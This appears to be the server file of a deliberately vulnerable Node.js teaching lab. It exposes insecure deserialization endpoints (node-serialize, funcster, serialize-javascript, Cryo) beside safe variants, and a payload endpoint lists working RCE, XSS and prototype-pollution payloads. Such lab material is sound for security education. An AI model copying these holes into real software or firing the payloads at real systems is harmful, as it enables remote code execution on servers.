const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');

// 취약한 직렬화 모듈들 (교육 목적)
const nodeSerialize = require('node-serialize');
const serializeJS = require('serialize-javascript');
const funcster = require('funcster');
const Cryo = require('cryo');

const app = express();
const PORT = process.env.PORT || 3001;

// 미들웨어 설정
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));

// 로깅 미들웨어
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
    next();
});

// ===== 보안 경고 =====
console.log('🚨 WARNING: This server contains intentional vulnerabilities for educational purposes!');
console.log('🚨 DO NOT use this in production environments!');
console.log('🚨 Only use in isolated testing environments!');

// 메인 페이지
app.get('/', (req, res) => {
    res.json({
        message: '🟢 WebSec-Lab Node.js Deserialization Testing API',
        warning: '⚠️ This API contains intentional vulnerabilities for educational purposes only!',
        endpoints: {
            'POST /api/node-serialize': 'node-serialize vulnerability testing',
            'POST /api/serialize-javascript': 'serialize-javascript XSS testing',
            'POST /api/funcster': 'funcster RCE testing',
            'POST /api/cryo': 'cryo prototype pollution testing',
            'GET /api/generate-payload': 'payload generation examples',
            'GET /api/health': 'health check'
        },
        version: '1.0.0'
    });
});

// ===== 1. node-serialize 취약점 테스트 =====
app.post('/api/node-serialize', (req, res) => {
    try {
        const { payload, mode } = req.body;
        
        console.log('🔥 node-serialize vulnerability test started');
        console.log('Payload received:', payload);
        
        if (mode === 'safe') {
            // 안전한 방법 - JSON 사용
            const data = JSON.parse(payload);
            res.json({
                success: true,
                result: data,
                method: 'JSON.parse (safe)',
                warning: '✅ This is the safe way to handle data'
            });
        } else {
            // 🚨 취약한 방법 - node-serialize 사용
            console.log('⚠️ WARNING: About to execute potentially malicious payload');
            
            const startTime = Date.now();
            let result;
            let error = null;
            
            try {
                // 🚨 DANGEROUS: Unserializing untrusted data
                result = nodeSerialize.unserialize(payload);
                
                res.json({
                    success: true,
                    result: result,
                    method: 'node-serialize.unserialize (vulnerable)',
                    executionTime: Date.now() - startTime,
                    warning: '🚨 VULNERABILITY: Arbitrary code execution possible!',
                    impact: 'If this was a real attack, the server could be completely compromised!'
                });
                
            } catch (err) {
                error = err.message;
                res.json({
                    success: false,
                    error: error,
                    method: 'node-serialize.unserialize (vulnerable)',
                    executionTime: Date.now() - startTime,
                    warning: '🚨 Payload execution failed, but vulnerability exists!'
                });
            }
        }
        
    } catch (err) {
        res.status(400).json({
            success: false,
            error: err.message,
            tip: 'Check your payload format'
        });
    }
});

// ===== 2. serialize-javascript XSS 테스트 =====
app.post('/api/serialize-javascript', (req, res) => {
    try {
        const { data, mode } = req.body;
        
        console.log('🔥 serialize-javascript XSS test started');
        
        if (mode === 'safe') {
            // 안전한 방법 - isJSON 옵션 사용
            const serialized = serializeJS(data, { isJSON: true });
            res.json({
                success: true,
                serialized: serialized,
                method: 'serialize-javascript with isJSON: true (safe)',
                warning: '✅ XSS prevented by isJSON option'
            });
        } else {
            // 🚨 취약한 방법 - 필터링 없음
            const serialized = serializeJS(data);
            
            // XSS 페이로드가 포함된 HTML 생성
            const html = `
                <!DOCTYPE html>
                <html>
                <head><title>XSS Test</title></head>
                <body>
                    <h1>Serialized Data Test</h1>
                    <script>
                        var userData = ${serialized};
                        console.log('User data:', userData);
                        document.body.innerHTML += '<p>Data loaded: ' + JSON.stringify(userData) + '</p>';
                    </script>
                </body>
                </html>
            `;
            
            res.json({
                success: true,
                serialized: serialized,
                html: html,
                method: 'serialize-javascript (vulnerable)',
                warning: '🚨 XSS VULNERABILITY: Script injection possible in browser!',
                impact: 'If served to a browser, malicious scripts could execute!'
            });
        }
        
    } catch (err) {
        res.status(400).json({
            success: false,
            error: err.message
        });
    }
});

// ===== 3. funcster RCE 테스트 =====
app.post('/api/funcster', (req, res) => {
    try {
        const { serializedFunction, mode } = req.body;
        
        console.log('🔥 funcster RCE test started');
        
        if (mode === 'safe') {
            res.json({
                success: true,
                message: 'Safe mode: Function deserialization disabled',
                recommendation: 'Use JSON for data, separate code from data',
                warning: '✅ No function deserialization performed'
            });
        } else {
            // 🚨 취약한 방법 - 함수 역직렬화
            console.log('⚠️ WARNING: About to deserialize and execute function');
            
            const startTime = Date.now();
            let result;
            let error = null;
            
            try {
                // 🚨 DANGEROUS: Deserializing function from untrusted source
                const func = funcster.deserialize(serializedFunction);
                
                // 실제로는 실행하지 않고 시뮬레이션만
                result = {
                    functionType: typeof func,
                    functionString: func.toString(),
                    simulatedExecution: 'Function deserialized successfully (not executed for safety)'
                };
                
                res.json({
                    success: true,
                    result: result,
                    method: 'funcster.deserialize (vulnerable)',
                    executionTime: Date.now() - startTime,
                    warning: '🚨 RCE VULNERABILITY: Arbitrary function execution possible!',
                    impact: 'If executed, this could run any JavaScript code on the server!'
                });
                
            } catch (err) {
                error = err.message;
                res.json({
                    success: false,
                    error: error,
                    method: 'funcster.deserialize (vulnerable)',
                    executionTime: Date.now() - startTime,
                    warning: '🚨 Deserialization failed, but vulnerability exists!'
                });
            }
        }
        
    } catch (err) {
        res.status(400).json({
            success: false,
            error: err.message
        });
    }
});

// ===== 4. cryo 프로토타입 오염 테스트 =====
app.post('/api/cryo', (req, res) => {
    try {
        const { frozenData, mode } = req.body;
        
        console.log('🔥 cryo prototype pollution test started');
        
        if (mode === 'safe') {
            // 안전한 방법 - Object.freeze 사용
            const data = JSON.parse(frozenData);
            const safeData = Object.freeze(data);
            
            res.json({
                success: true,
                result: safeData,
                method: 'JSON.parse + Object.freeze (safe)',
                prototypeCheck: 'No prototype pollution detected',
                warning: '✅ Safe deserialization without prototype pollution'
            });
        } else {
            // 🚨 취약한 방법 - cryo 사용
            console.log('⚠️ WARNING: About to perform potentially dangerous deserialization');
            
            const startTime = Date.now();
            
            // 프로토타입 오염 전 상태 확인
            const beforePollution = {
                objectPrototype: Object.prototype.polluted,
                testObjectPolluted: ({}).polluted
            };
            
            try {
                // 🚨 DANGEROUS: Deserializing with potential prototype pollution
                const thawed = Cryo.parse(frozenData);
                
                // 프로토타입 오염 후 상태 확인
                const afterPollution = {
                    objectPrototype: Object.prototype.polluted,
                    testObjectPolluted: ({}).polluted,
                    newObjectPolluted: ({}).polluted
                };
                
                res.json({
                    success: true,
                    result: thawed,
                    method: 'Cryo.parse (vulnerable)',
                    executionTime: Date.now() - startTime,
                    prototypeCheck: {
                        before: beforePollution,
                        after: afterPollution,
                        polluted: afterPollution.testObjectPolluted !== undefined
                    },
                    warning: '🚨 PROTOTYPE POLLUTION VULNERABILITY!',
                    impact: 'Object.prototype may have been polluted, affecting all objects!'
                });
                
            } catch (err) {
                res.json({
                    success: false,
                    error: err.message,
                    method: 'Cryo.parse (vulnerable)',
                    executionTime: Date.now() - startTime,
                    warning: '🚨 Deserialization failed, but vulnerability exists!'
                });
            }
        }
        
    } catch (err) {
        res.status(400).json({
            success: false,
            error: err.message
        });
    }
});

// ===== 5. 페이로드 생성 예제 =====
app.get('/api/generate-payload', (req, res) => {
    const payloadExamples = {
        nodeSerialize: {
            description: 'node-serialize RCE payload',
            payload: '{"rce":"_$$ND_FUNC$$_function(){require(\\'child_process\\').exec(\\'calc.exe\\', function(error, stdout, stderr) { console.log(stdout) });}()"}',
            usage: 'POST to /api/node-serialize with this payload'
        },
        serializeJavaScript: {
            description: 'serialize-javascript XSS payload',
            payload: {
                name: '</script><script>alert("XSS")</script>',
                data: 'malicious content'
            },
            usage: 'POST to /api/serialize-javascript with this data'
        },
        funcster: {
            description: 'funcster RCE payload',
            payload: 'function() { require("child_process").exec("whoami"); }',
            usage: 'Serialize this function with funcster.serialize() first'
        },
        cryo: {
            description: 'cryo prototype pollution payload',
            payload: '{"__proto__":{"polluted":"yes","isAdmin":true},"normalData":"hello"}',
            usage: 'POST to /api/cryo with this frozenData'
        }
    };
    
    res.json({
        message: 'Payload examples for educational purposes',
        warning: '⚠️ USE ONLY IN ISOLATED TEST ENVIRONMENTS!',
        examples: payloadExamples,
        disclaimer: 'These payloads are for security education only. Do not use maliciously.'
    });
});

// ===== 헬스 체크 =====
app.get('/api/health', (req, res) => {
    res.json({
        status: 'running',
        timestamp: new Date().toISOString(),
        vulnerabilities: {
            'node-serialize': 'active',
            'serialize-javascript': 'active',
            'funcster': 'active',
            'cryo': 'active'
        },
        warning: '🚨 This server contains intentional vulnerabilities!'
    });
});

// 404 핸들러
app.use((req, res) => {
    res.status(404).json({
        error: 'Endpoint not found',
        availableEndpoints: [
            'GET /',
            'POST /api/node-serialize',
            'POST /api/serialize-javascript', 
            'POST /api/funcster',
            'POST /api/cryo',
            'GET /api/generate-payload',
            'GET /api/health'
        ]
    });
});

// 에러 핸들러
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({
        error: 'Internal server error',
        message: err.message
    });
});

// 서버 시작
app.listen(PORT, () => {
    console.log('🟢 ===============================================');
    console.log(`🟢 WebSec-Lab Node.js API Server running on port ${PORT}`);
    console.log('🟢 ===============================================');
    console.log('🚨 WARNING: INTENTIONAL VULNERABILITIES PRESENT!');
    console.log('🚨 FOR EDUCATIONAL USE ONLY!');
    console.log('🚨 DO NOT USE IN PRODUCTION!');
    console.log('🟢 ===============================================');
    console.log(`🟢 API Base URL: http://localhost:${PORT}`);
    console.log('🟢 Available endpoints:');
    console.log('🟢   GET  /                        - API info');
    console.log('🟢   POST /api/node-serialize       - node-serialize test');
    console.log('🟢   POST /api/serialize-javascript - XSS test');
    console.log('🟢   POST /api/funcster            - RCE test');
    console.log('🟢   POST /api/cryo                - Prototype pollution test');
    console.log('🟢   GET  /api/generate-payload    - Payload examples');
    console.log('🟢   GET  /api/health              - Health check');
    console.log('🟢 ===============================================');
});

module.exports = app;